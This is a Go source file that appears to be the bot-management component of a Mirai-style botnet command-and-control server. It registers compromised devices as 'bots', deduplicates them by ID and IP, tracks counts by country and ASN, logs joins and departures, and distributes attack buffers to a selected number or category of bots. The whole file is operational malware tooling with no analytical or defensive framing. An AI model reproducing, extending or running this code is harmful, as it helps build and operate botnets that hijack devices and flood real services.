package main

import (
	"fmt"
	"math/rand"
	"sync"
	"time"
)

type AttackSend struct {
	buf     []byte
	count   int
	botCata string
}

type ClientList struct {
	uid         int
	count       int
	clients     map[int]*Bot
	botIndex    map[string]int
	seenIDs     map[string]struct{}
	seenIPs     map[string]struct{}
	addQueue    chan *Bot
	delQueue    chan *Bot
	atkQueue    chan *AttackSend
	totalCount  chan int
	cntView     chan int
	distViewReq chan int
	distViewRes chan map[string]int
	cntMutex    *sync.Mutex

	// Refusal counters
	refIDCount  int
	refIPCount  int
	refInvalid  int
	refMutex    *sync.Mutex

	// ========== COUNTRY + ASN TRACKING ==========
	prevCountry map[string]int // last known country counts
	prevASN     map[string]int // last known ASN counts
}

func NewClientList() *ClientList {
	c := &ClientList{
		uid:         0,
		count:       0,
		clients:     make(map[int]*Bot),
		botIndex:    make(map[string]int),
		seenIDs:     make(map[string]struct{}),
		seenIPs:     make(map[string]struct{}),
		addQueue:    make(chan *Bot, 128),
		delQueue:    make(chan *Bot, 128),
		atkQueue:    make(chan *AttackSend),
		totalCount:  make(chan int, 64),
		cntView:     make(chan int),
		distViewReq: make(chan int),
		distViewRes: make(chan map[string]int),
		cntMutex:    &sync.Mutex{},

		refIDCount: 0,
		refIPCount: 0,
		refInvalid: 0,
		refMutex:   &sync.Mutex{},

		prevCountry: make(map[string]int),
		prevASN:     make(map[string]int),
	}
	go c.worker()
	go c.fastCountWorker()
	go c.refusalReporter()
	return c
}

// Safe access to all bots for GeoIP lookups
func (this *ClientList) AllClients() map[int]*Bot {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	out := make(map[int]*Bot, len(this.clients))
	for k, v := range this.clients {
		out[k] = v
	}
	return out
}

// Get country stats with +new/-delta
func (this *ClientList) CountryStats(current map[string]int) (stats map[string][3]int) {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	stats = make(map[string][3]int)

	// Merge all keys
	keys := make(map[string]struct{})
	for k := range current {
		keys[k] = struct{}{}
	}
	for k := range this.prevCountry {
		keys[k] = struct{}{}
	}

	for k := range keys {
		curr := current[k]
		prev := this.prevCountry[k]
		stats[k] = [3]int{curr, max(0, curr-prev), max(0, prev-curr)}
	}

	// Save for next time
	this.prevCountry = current
	return
}

// Get ASN stats with +new/-delta
func (this *ClientList) ASNStats(current map[string]int) (stats map[string][3]int) {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	stats = make(map[string][3]int)

	keys := make(map[string]struct{})
	for k := range current {
		keys[k] = struct{}{}
	}
	for k := range this.prevASN {
		keys[k] = struct{}{}
	}

	for k := range keys {
		curr := current[k]
		prev := this.prevASN[k]
		stats[k] = [3]int{curr, max(0, curr-prev), max(0, prev-curr)}
	}

	this.prevASN = current
	return
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func (this *ClientList) Count() int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	return len(this.clients)
}

func (this *ClientList) Distribution() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	this.distViewReq <- 0
	return <-this.distViewRes
}

func (this *ClientList) Available() map[string]int {
	this.cntMutex.Lock()
	defer this.cntMutex.Unlock()
	out := make(map[string]int)
	for _, v := range this.clients {
		out[v.source]++
	}
	return out
}

func (this *ClientList) AddClient(c *Bot) {
	this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
	this.delQueue <- c
}

func splitBotShare(total, slots int) int {
	if slots <= 1 || total <= 0 {
		return total
	}
	share := total / slots
	if share < 1 {
		return 1
	}
	return share
}

func splitBotCount(total, slots int) int {
	if slots <= 1 || total <= 0 {
		return total
	}
	base := total / slots
	if total%slots != 0 {
		return base + 1
	}
	return base
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
	attack := &AttackSend{buf, maxbots, botCata}
	this.atkQueue <- attack
}

func (this *ClientList) fastCountWorker() {
	for {
		select {
		case delta := <-this.totalCount:
			this.count += delta
		case <-this.cntView:
			this.cntView <- this.count
		}
	}
}

func (this *ClientList) refusalReporter() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		this.refMutex.Lock()

		totalRef := this.refIDCount + this.refIPCount + this.refInvalid
		if totalRef > 0 {
			fmt.Printf("\x1b[1;31m[ REFUSED ] %d IPs: %d\x1b[0m\n",
				totalRef, this.refIPCount)
			this.refIDCount = 0
			this.refIPCount = 0
			this.refInvalid = 0
		}

		this.refMutex.Unlock()
	}
}

func (this *ClientList) worker() {
	rand.Seed(time.Now().UTC().UnixNano())

	for {
		select {
		case add := <-this.addQueue:
			if add.dropped {
				break
			}

			if add.id == "" || add.id == "-1" {
				add.dropped = true
				if add.conn != nil {
					_ = add.conn.Close()
				}
				this.refMutex.Lock()
				this.refInvalid++
				this.refMutex.Unlock()
				break
			}

			if _, exists := this.seenIDs[add.id]; exists {
				add.dropped = true
				if add.conn != nil {
					_ = add.conn.Close()
				}
				this.refMutex.Lock()
				this.refIDCount++
				this.refMutex.Unlock()
				break
			}

			ipKey := add.remoteIPKey()
			if ipKey != "" {
				if _, exists := this.seenIPs[ipKey]; exists {
					add.dropped = true
					if add.conn != nil {
						_ = add.conn.Close()
					}
					this.refMutex.Lock()
					this.refIPCount++
					this.refMutex.Unlock()
					break
				}
			}

			this.uid++
			add.uid = this.uid
			this.clients[add.uid] = add
			this.botIndex[add.id] = add.uid
			this.seenIDs[add.id] = struct{}{}
			if ipKey != "" {
				this.seenIPs[ipKey] = struct{}{}
			}
			this.totalCount <- 1
			fmt.Printf("\x1b[1;32m[ JOINED ] \x1b[38;5;99mConnect :\x1b[1;33m%s \x1b[38;5;99mType:\x1b[1;33m%s \x1b[38;5;99mVer:\x1b[1;33m%d \x1b[38;5;99mArch:\x1b[1;33m%s\n",
				add.conn.RemoteAddr(), add.source, add.version, add.ArchName())

		case del := <-this.delQueue:
			if del.uid == -1 {
				del.dropped = true
				break
			}
			if _, exists := this.clients[del.uid]; exists {
				delete(this.botIndex, del.id)
				delete(this.seenIDs, del.id)
				if ipKey := del.remoteIPKey(); ipKey != "" {
					delete(this.seenIPs, ipKey)
				}
				delete(this.clients, del.uid)
				this.totalCount <- -1
				fmt.Printf("\x1b[1;32m[ LEAVE ] \x1b[38;5;99mDisconnected :\x1b[1;33m%s \x1b[38;5;99mType:\x1b[1;33m%s\n",
					del.conn.RemoteAddr(), del.source)
			}

		case atk := <-this.atkQueue:
			if atk.count == -1 {
				total := this.Count()
				requested := splitBotCount(total, GetGlobalConcurrent())
				if requested < 1 {
					requested = 1
				}
				var sent int
				for _, v := range this.clients {
					if (atk.botCata == "" || atk.botCata == v.source) && sent < requested {
						v.QueueBuf(atk.buf)
						sent++
					}
				}
			} else {
				var count int
				for _, v := range this.clients {
					if count >= atk.count {
						break
					}
					if atk.botCata == "" || atk.botCata == v.source {
						v.QueueBuf(atk.buf)
						count++
					}
				}
			}

		case <-this.distViewReq:
			res := make(map[string]int)
			for _, v := range this.clients {
				res[v.source]++
			}
			this.distViewRes <- res
		}
	}
}